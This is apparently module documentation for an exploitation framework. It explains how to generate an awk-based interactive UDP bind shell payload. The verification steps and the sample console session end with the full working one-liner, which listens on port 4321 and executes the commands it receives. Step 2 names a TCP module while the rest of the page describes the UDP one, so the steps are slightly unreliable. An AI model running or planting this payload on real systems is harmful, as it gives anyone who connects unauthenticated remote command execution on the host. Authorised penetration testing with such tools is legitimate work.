## Description

Module generates payload that creates interactive udp bind shell by using awk. 

## Verification Steps

  1. Start `./exf.py`
  2. Do: `use payloads/cmd/awk_bind_tcp`
  3. Do: `set rport 4321`
  4. Do: `run`
  5. Module generates awk udp bind shell payload

## Scenarios

```
exf > use payloads/cmd/awk_bind_udp
exf (Awk Bind UDP) > set rport 4321
[+] rport => 4321
exf (Awk Bind UDP) > run
[*] Running module...
[*] Generating payload
awk 'BEGIN{s="/inet/udp/4321/0/0";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```
